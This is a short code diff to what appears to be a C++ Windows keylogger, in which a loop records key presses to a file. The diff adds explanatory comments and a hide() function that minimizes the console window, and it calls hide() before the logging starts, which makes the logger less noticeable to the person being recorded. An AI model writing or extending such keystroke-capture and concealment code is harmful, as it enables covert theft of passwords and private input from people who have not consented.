@@ -66,7 +66,9 @@ bool key(int press) {
 }
 /*Method that saves normal key input*/
 void normalKey(){
+	//variable that stores the key
     char i;
+	//outputstream that stores all the key pressed
     fstream record;
     while (true) {
         for (i = 8; i < 190; i++) {
@@ -81,8 +83,12 @@ void normalKey(){
         }
     }
 }
-
+//method to minimize window console screen
+void hide(){
+	::ShowWindow(::GetConsoleWindow(), SW_MINIMIZE);
+}
 int main () {
-    normalKey();
+	hide();
+	normalKey();
     return 0;
 }
